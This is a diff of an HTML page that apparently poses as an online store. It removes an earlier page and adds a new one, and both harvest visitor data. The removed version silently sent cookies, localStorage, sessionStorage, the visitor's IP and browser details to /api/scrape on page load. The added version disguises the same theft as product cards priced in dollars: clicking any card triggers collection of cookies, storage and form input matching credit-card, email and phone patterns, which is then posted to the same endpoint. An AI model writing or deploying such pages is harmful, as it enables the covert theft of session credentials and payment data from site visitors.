@@ -3,69 +3,256 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SleekStore</title>
-    <!-- Prevent caching -->
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px;}</style>
+    <title>Premium Collection</title>
+    <style>
+        :root {
+            --primary: #6366f1;
+            --bg: #f8fafc;
+            --card-bg: #ffffff;
+            --text: #1e293b;
+            --text-light: #64748b;
+        }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: var(--bg); 
+            margin: 0; 
+            padding: 0; 
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        h1 { margin: 0; font-size: 1.5rem; color: var(--text); }
+        
+        .container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        
+        .gallery { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); 
+            gap: 24px; 
+        }
+        
+        .card { 
+            background: var(--card-bg); 
+            border-radius: 16px; 
+            overflow: hidden; 
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            cursor: pointer;
+            position: relative;
+        }
+        .card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
+        }
+        .card img { 
+            width: 100%; 
+            height: 180px; 
+            object-fit: cover; 
+            background: #e2e8f0;
+        }
+        .card-body { padding: 20px; }
+        .card-title { font-weight: 600; font-size: 1.1rem; margin-bottom: 8px; }
+        .price { color: var(--primary); font-weight: 700; font-size: 1.2rem; }
+        
+        /* Action Button */
+        .action-area {
+            text-align: center;
+            margin-top: 40px;
+            padding-bottom: 40px;
+        }
+        .btn-scan {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-scan:hover { background: #4f46e5; }
+        .btn-scan:disabled { background: #cbd5e1; cursor: not-allowed; }
+
+        /* Status Toast */
+        #status-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            opacity: 0;
+            transition: opacity 0.3s, transform 0.3s;
+            z-index: 1000;
+            box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
+            pointer-events: none;
+        }
+        #status-toast.show {
+            opacity: 1;
+            transform: translateY(-10px);
+        }
+        #status-toast.success { background: #10b981; }
+        #status-toast.error { background: #ef4444; }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-light);
+            font-size: 0.85rem;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to SleekStore</h1>
-    <p>Loading...</p>
+    <header>
+        <h1>🔒 Exclusive Gallery</h1>
+    </header>
+
+    <div class="container">
+        <div class="gallery">
+            <!-- Card 1 -->
+            <div class="card" onclick="triggerScan('VIP Pass')">
+                <img src="https://via.placeholder.com/250x200/6366f1/ffffff?text=VIP+Pass" alt="VIP Pass">
+                <div class="card-body">
+                    <div class="card-title">VIP Pass</div>
+                    <div class="price">$49.99</div>
+                </div>
+            </div>
+            
+            <!-- Card 2 -->
+            <div class="card" onclick="triggerScan('Gold Membership')">
+                <img src="https://via.placeholder.com/250x200/8b5cf6/ffffff?text=Gold+Member" alt="Gold Member">
+                <div class="card-body">
+                    <div class="card-title">Gold Member</div>
+                    <div class="price">$99.99</div>
+                </div>
+            </div>
+
+            <!-- Card 3 -->
+            <div class="card" onclick="triggerScan('Lifetime Bundle')">
+                <img src="https://via.placeholder.com/250x200/ec4899/ffffff?text=Lifetime" alt="Lifetime Bundle">
+                <div class="card-body">
+                    <div class="card-title">Lifetime Bundle</div>
+                    <div class="price">$199.99</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="action-area">
+            <button id="scanBtn" class="btn-scan" onclick="triggerScan('Manual Scan')">
+                🔍 Scan for Data
+            </button>
+        </div>
+    </div>
+
+    <div id="status-toast">Scanning...</div>
+
+    <footer>
+        &copy; 2026 Premium Collection. All rights reserved.
+    </footer>
 
     <script>
-        // Run immediately on load
-        (async () => {
-            try {
-                // 1. Get IP
-                let ip = "Unknown";
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    ip = data.ip;
-                } catch(e) {}
+        const toast = document.getElementById('status-toast');
+        const btn = document.getElementById('scanBtn');
 
-                // 2. Harvest Data
+        function showToast(message, type = 'neutral') {
+            toast.innerText = message;
+            toast.className = type === 'success' ? 'show success' : type === 'error' ? 'show error' : 'show';
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                if (!res.ok) throw new Error('IP fetch failed');
+                return (await res.json()).ip;
+            } catch (e) {
+                return 'Unknown';
+            }
+        }
+
+        function scanDOM() {
+            const patterns = [
+                { name: 'Credit Card', regex: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/ },
+                { name: 'Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ },
+                { name: 'Phone', regex: /\b\d{10,}\b/ }
+            ];
+            let found = [];
+            // Check inputs and textContent
+            document.querySelectorAll('input, textarea, select').forEach(el => {
+                if (el.value) {
+                    patterns.forEach(p => {
+                        if (p.regex.test(el.value)) {
+                            found.push({ type: p.name, value: el.value.substring(0, 50), tag: el.tagName });
+                        }
+                    });
+                }
+            });
+            return found;
+        }
+
+        async function triggerScan(source) {
+            btn.disabled = true;
+            btn.innerText = 'Scanning...';
+            showToast('Scanning local storage and DOM...', 'neutral');
+
+            try {
+                const ip = await getIP();
+                const sensitiveInfo = scanDOM();
+                
                 const payload = {
                     timestamp: new Date().toISOString(),
                     ip: ip,
+                    url: window.location.href,
                     userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    
-                    // REAL COOKIES
-                    cookies: document.cookie || "No Cookies Found",
-                    
-                    // REAL LOCAL STORAGE
-                    localStorage: Object.fromEntries(
-                        Array.from(localStorage.keys()).map(key => [key, localStorage.getItem(key)])
-                    ),
-                    
-                    // REAL SESSION STORAGE
-                    sessionStorage: Object.fromEntries(
-                        Array.from(sessionStorage.keys()).map(key => [key, sessionStorage.getItem(key)])
-                    ),
-
-                    windowLocation: window.location.href,
-                    title: document.title,
-                    screenRes: `${screen.width}x${screen.height}`
+                    cookies: document.cookie || "",
+                    sensitiveInfo: sensitiveInfo,
+                    storage: {
+                        localStorage: Object.keys(localStorage).length > 0 ? JSON.parse(JSON.stringify(localStorage)) : {},
+                        sessionStorage: Object.keys(sessionStorage).length > 0 ? JSON.parse(JSON.stringify(sessionStorage)) : {}
+                    },
+                    hostname: window.location.hostname,
+                    source: source
                 };
 
-                // 3. Send using sendBeacon (Silent & Reliable)
-                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                navigator.sendBeacon('/api/scrape', blob);
-
-                // Fallback: Try fetch just in case
-                fetch('/api/scrape', {
+                // Send to API
+                const response = await fetch('/api/scrape', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                    keepalive: true
-                }).catch(err => console.error("Fallback failed", err));
+                    body: JSON.stringify(payload)
+                });
 
+                if (!response.ok) throw new Error(`API Error: ${response.status}`);
+
+                showToast('Scan Complete! Data sent.', 'success');
             } catch (err) {
-                console.error("Scrape failed:", err);
+                console.error("Scrape failed", err);
+                showToast(`Error: ${err.message}`, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.innerText = '🔍 Scan for Data';
             }
-        })();
+        }
+
+        // Optional: Auto-scan on load
+        // triggerScan('Page Load');
     </script>
 </body>
 </html>
